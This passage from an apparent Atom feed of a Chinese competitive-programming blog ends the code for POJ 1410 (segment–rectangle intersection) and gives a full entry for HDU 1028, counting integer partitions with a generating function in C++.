class="string">"T\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(rec.relationpoint(l.s) || rec.relationpoint(l.e)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"T\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"F\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目链接：&lt;a href=&quot;http://poj.org/problem?id=1410&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;POJ 1410&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;You are to write a program that has to decide whether a given line segment intersects a given rectangle. &lt;/p&gt;
&lt;p&gt;An example: &lt;/p&gt;
&lt;p&gt;line: start point: (4,9) &lt;/p&gt;
&lt;p&gt;end point: (11,2) &lt;/p&gt;
&lt;p&gt;rectangle: left-top: (1,5) &lt;/p&gt;
&lt;p&gt;right-bottom: (7,1) &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/WuTao18/images/master/gitnote/2019/11/11/1573482242971-1573482243153.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Figure 1: Line segment does not intersect rectangle &lt;/p&gt;
&lt;p&gt;The line is said to intersect the rectangle if the line and the rectangle have at least one point in common. The rectangle consists of four straight lines and the area in between. Although all input values are integer numbers, valid intersection points do not have to lay on the integer grid. &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="计算几何" scheme="http://wutao18.github.io/tags/%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>HDU 1028 Ignatius and the Princess III (生成函数/母函数)</title>
    <link href="http://wutao18.github.io/2019/11/10/HDU-1028-Ignatius-and-the-Princess-III-%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0-%E6%AF%8D%E5%87%BD%E6%95%B0/"/>
    <id>http://wutao18.github.io/2019/11/10/HDU-1028-Ignatius-and-the-Princess-III-%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0-%E6%AF%8D%E5%87%BD%E6%95%B0/</id>
    <published>2019-11-10T07:49:55.000Z</published>
    <updated>2020-10-27T03:28:57.880Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1028" target="_blank" rel="noopener">HDU 1028</a></p><a id="more"></a><h2 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><blockquote><p>“Well, it seems the first problem is too easy. I will let you know how foolish you are later.” feng5166 says.</p><p>“The second problem is, given an positive integer N, we define an equation like this:</p><p>  N=a[1]+a[2]+a[3]+…+a[m];</p><p>  a[i]&gt;0,1&lt;=m&lt;=N;</p><p>My question is how many different equations you can find for a given N.</p><p>For example, assume N is 4, we can find:</p><p>  4 = 4;</p><p>  4 = 3 + 1;</p><p>  4 = 2 + 2;</p><p>  4 = 2 + 1 + 1;</p><p>  4 = 1 + 1 + 1 + 1;</p><p>so the result is 5 when N is 4. Note that “4 = 3 + 1” and “4 = 1 + 3” is the same in this problem. Now, you do it!”</p></blockquote><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><blockquote><p>The input contains several test cases. Each test case contains a positive integer N(1&lt;=N&lt;=120) which is mentioned above. The input is terminated by the end of file.</p></blockquote><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><blockquote><p>For each test case, you have to output a line contains an integer P which indicate the different equations you have found.</p></blockquote><h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">10</span><br><span class="line">20</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">42</span><br><span class="line">627</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>给定 $n$，求 $n$ 的划分数。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>普通母函数。母函数 $G(x) = (1+x+x^2+…)(1+x^2+x^4+…)(1+x^3+x^6+…)…$。</p><p>$(1+x+x^2+…)=(x^{0\times1}+x^{1\times1}+x^{2\times1}+…)$ 代表不用数字 $1$，用一次数字 $1$，用两次数字 $1$……</p><p>动态规划的版本见<a href="https://wutao18.github.io/2019/11/04/HDU-1028-Ignatius-and-the-Princess-III-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/">这里</a>。</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> c1[maxn], c2[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; maxn; ++i) &#123;</span><br><span class="line">        c1[i] = <span class="number">1</span>;</span><br><span class="line">        c2[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; maxn; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; maxn; ++j) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k + j &lt; maxn; k += i) &#123;</span><br><span class="line">                c2[k + j] += c1[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; maxn; ++j) &#123;</span><br><span class="line">            c1[j] = c2[j];</span><br><span class="line">            c2[j] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, c1[n]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目链接：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=1028&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;HDU 1028&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="数学" scheme="http://wutao18.github.io/tags/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="生成函数/母函数" scheme="http://wutao18.github.io/tags/%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0-%E6%AF%8D%E5%87%BD%E6%95%B0/"/>
    
      <category term="组合数学" scheme="http://wutao18.github.io/tags/%E7%BB%84%E5%90%88%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
</feed>
